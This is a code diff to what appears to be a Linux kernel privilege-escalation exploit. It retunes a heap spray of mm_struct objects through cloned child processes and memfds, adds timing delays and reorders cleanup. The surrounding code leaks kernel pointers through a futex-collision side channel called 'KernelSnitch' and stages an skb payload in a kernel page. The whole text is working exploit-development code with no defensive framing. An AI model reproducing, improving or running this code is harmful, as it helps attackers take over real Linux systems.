@@ -1,0 +1,95 @@
+diff --git a/src/core/common.h b/src/core/common.h
+index 51d153a..168fabf 100644
+--- a/src/core/common.h
++++ b/src/core/common.h
+@@ -45,7 +45,7 @@
+ 
+ #define MM_STRUCT_SZ 0x500
+ #define MM_ORDER 3
+-#define MM_PARTIALS 5
++#define MM_PARTIALS 2
+ extern int g_core_main;
+ extern int g_core_consumer;
+ #define CORE (g_core_main)
+diff --git a/src/core/util.c b/src/core/util.c
+index 2fcd3fa..2d4d2d7 100644
+--- a/src/core/util.c
++++ b/src/core/util.c
+@@ -295,7 +295,7 @@ int clone_memfd(void) {
+ }
+ 
+ void prepare_ctxs(void) {
+-  prepare_ctx.mm_cnt = 8 * mm_objs_per_slab;
++  prepare_ctx.mm_cnt = 5 * mm_objs_per_slab;
+   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
+   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
+ 
+@@ -409,11 +409,13 @@ uintptr_t prepare_kernel_page(void) {
+   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+     prepare_ctx.childs[i] = clone_child();
+     prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
++    if ((i & 7) == 7) usleep(5000);
+   }
+ 
+   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+     spray_ctx.childs[i] = clone_child();
+     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
++    if ((i & 7) == 7) usleep(5000);
+   }
+ 
+   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+@@ -447,6 +449,11 @@ uintptr_t prepare_kernel_page(void) {
+   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+     kill_child(spray_ctx.childs[i]);
+   }
++  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
++    SYSCHK(close(prepare_ctx.memfds[i]));
++    prepare_ctx.memfds[i] = -1;
++    kill_child(prepare_ctx.childs[i]);
++  }
+   pr_info("[spray] finding futex collisions... +%lldms\n",
+           ms_since(&t_spray));
+   {
+@@ -495,9 +502,6 @@ uintptr_t prepare_kernel_page(void) {
+     pr_warning("[spray] futex collisions not found\n");
+     kernelsnitch_cleanup(ks);
+     ks = NULL;
+-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+-      kill_child(prepare_ctx.childs[i]);
+-    }
+     cleanup_page_prepare_state();
+     return 0;
+   }
+@@ -513,9 +517,6 @@ uintptr_t prepare_kernel_page(void) {
+     pr_warning("KernelSnitch mm_struct leak failed\n");
+     kernelsnitch_cleanup(ks);
+     ks = NULL;
+-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+-      kill_child(prepare_ctx.childs[i]);
+-    }
+     cleanup_page_prepare_state();
+     return 0;
+   }
+@@ -524,9 +525,6 @@ uintptr_t prepare_kernel_page(void) {
+   if (!prepare_skb_payload(base)) {
+     kernelsnitch_cleanup(ks);
+     ks = NULL;
+-    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+-      kill_child(prepare_ctx.childs[i]);
+-    }
+     cleanup_page_prepare_state();
+     return 0;
+   }
+@@ -590,12 +588,6 @@ uintptr_t prepare_kernel_page(void) {
+   kernelsnitch_cleanup(ks);
+   ks = NULL;
+ 
+-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+-    SYSCHK(close(prepare_ctx.memfds[i]));
+-    prepare_ctx.memfds[i] = -1;
+-    kill_child(prepare_ctx.childs[i]);
+-  }
+-
+   return base;
+ }
+ 
